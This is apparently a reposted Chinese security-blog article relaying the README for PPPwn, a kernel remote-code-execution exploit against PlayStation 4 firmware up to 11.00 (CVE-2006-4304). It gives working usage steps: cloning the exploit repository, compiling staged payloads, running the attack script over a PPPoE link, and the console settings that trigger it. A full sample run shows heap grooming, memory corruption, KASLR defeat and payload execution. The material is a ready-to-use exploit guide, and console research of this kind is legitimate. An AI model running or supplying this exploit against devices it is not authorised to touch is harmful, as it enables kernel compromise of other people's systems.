---
cve: "CVE-2006-4304"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  PPPwn - PlayStation 4 至 FW 11.00 的内核远程代码执行漏洞   
 Ots安全   2024-05-01 17:59  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
PPPwn 是适用于 PlayStation 4 至 FW 11.00 的内核远程代码执行漏洞。这是  
CVE-2006-4304  
的概念验证漏洞  
，已负责任地向 PlayStation 报告。  
  
支持的版本有：  
- 固件 9.00  
  
- 固件 11.00  
  
- 可以添加更多内容（欢迎 PR）  
  
该漏洞仅PPPwned  
作为概念验证打印在您的 PS4 上。为了启动 Mira 或类似的自制软件，stage2.bin  
需要调整有效负载。  
## 要求  
- ## 带以太网端口的计算机  
  
- USB 适配器也可以使用  
  
- 以太网电缆  
  
- Linux  
  
- 您可以使用 VirtualBox 创建一个 Linux VM，并将其Bridged Adapter  
作为网络适配器以使用 VM 中的以太网端口。  
  
- 安装了Python3和gcc  
  
## 用法  
## 在您的计算机上，克隆存储库：  
```
git clone --recursive https://github.com/TheOfficialFloW/PPPwn
```  
  
安装要求：  
```
sudo pip install -r requirements.txt
```  
  
编译有效负载：  
```
make -C stage1 FW=1100 clean && make -C stage1 FW=1100
make -C stage2 FW=1100 clean && make -C stage2 FW=1100
```  
  
对于其他固件，例如 FW 9.00，请传递FW=900  
。  
  
运行漏洞利用程序（请参阅 参考资料ifconfig  
获取正确的接口）：  
```
sudo python3 pppwn.py --interface=enp0s3 --fw=1100
```  
  
对于其他固件，例如 FW 9.00，请传递--fw=900  
。  
  
在你的 PS4 上：  
- 转到Settings  
然后Network  
  
- 选择Set Up Internet connection  
并选择Use a LAN Cable  
  
- 选择Custom  
设置并PPPoE  
选择IP Address Settings  
  
- 输入PPPoE User ID  
和的任何内容PPPoE Pasword  
  
- 选择  
和Automatic  
DNS Settings  
MTU Settings  
  
- 选择Do Not Use  
用于Proxy Server  
  
- 单击Test Internet Connection  
即可与您的计算机通信  
  
如果漏洞利用失败或 PS4 崩溃，您可以跳过互联网设置，只需单击Test Internet Connection  
。如果pppwn.py  
脚本卡在等待请求/响应，请中止它并在您的计算机上再次运行它，然后单击Test Internet Connection  
您的 PS4。  
  
如果该漏洞有效，您应该会看到类似于下面的输出，并且您应该会  
在 PS4 上看到Cannot connect to network.  
后面打印的内容。PPPwned  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacarws3ykJbRIA8mZhKAiaqoeWJcVlK5ciba3ib7o4LELuHYLFvC5U4dyxQ9DgGn0l1R5khQAjh7eEeg/640?wx_fmt=png&from=appmsg "")  
  
  
### 运行示例  
```
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
```  
  
  
项目地址：  
  
https://github.com/TheOfficialFloW/PPPwn  
  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
